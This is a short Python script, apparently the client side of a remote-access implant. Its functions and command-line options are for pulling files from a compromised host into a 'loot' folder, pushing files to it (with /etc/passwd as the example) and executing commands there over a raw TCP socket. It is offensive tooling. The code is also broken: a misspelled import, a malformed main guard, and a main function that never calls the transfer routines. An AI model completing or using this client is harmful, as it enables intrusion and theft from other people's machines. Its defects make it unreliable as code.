#!/usr/bin/env python3
import os
import socket
import base64
import argsparse
import sys
import time


def b64_file(file_up: str) -> bytes:
    with open(file_up, "rb") as f:
        myFile = f.read()
    myFileB64 = base64.b64encode(myFile)
    return myFileB64


def download(b64_down: str, file_out: str) -> None:
    decode = base64.b64decode(b64_down)
    l00t_folder = "./loot/" + file_out
    with open(l00t_folder, "wb") as w:
        w.write(decode)
    return 


def connection(dest: str, dest_port: int, data: str) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        conn = s.connect((dest, dest_port))
        s.send(data.encode("utf-8"))
        data = b""
        while True:
            part = s.recv(2048)
            data += part
            if len(part) < 2048:
                break
    return data


def main():
    # parser arguments
    parser = argparse.ArgumentParser(description="Communicates to Implant")
    parser.add_argument(
        "IP", metavar="<destination_ip>", help="Example: ./client.py <destination_host>"
    )
    parser.add_argument(
        "PORT", metavar="<destination_port>", help="Example: ./client.py 127.0.0.1 9999"
    )
    parser.add_argument(
        "--download",
        metavar="<download_file>",
        help="Example: ./client.py 127.0.0.1 9999 --download /path/to/remote/file",
    )
    parser.add_argument(
        "--upload",
        metavar="<upload_file>",
        help="Example: ./client.py 127.0.0.1 9999 --upload /path/to/upload/file",
    )
    parser.add_argument(
        "--destination_file",
        metavar="<destination_file>",
        help="Example: ./client.py 127.0.0.1 9999 --upload /etc/passwd --destination_file /path/on/remote/server",
    )
    parser.add_argument(
        "--execute",
        metavar="<execute_command>",
        help="Example: ./client.py 127.0.0.1 9999 --execute /bin/ls",
    )

    # variables
    args = parser.parse_args()
    IP = args.IP
    Port = int(args.PORT)


if _name_ == "__main__":
    main()
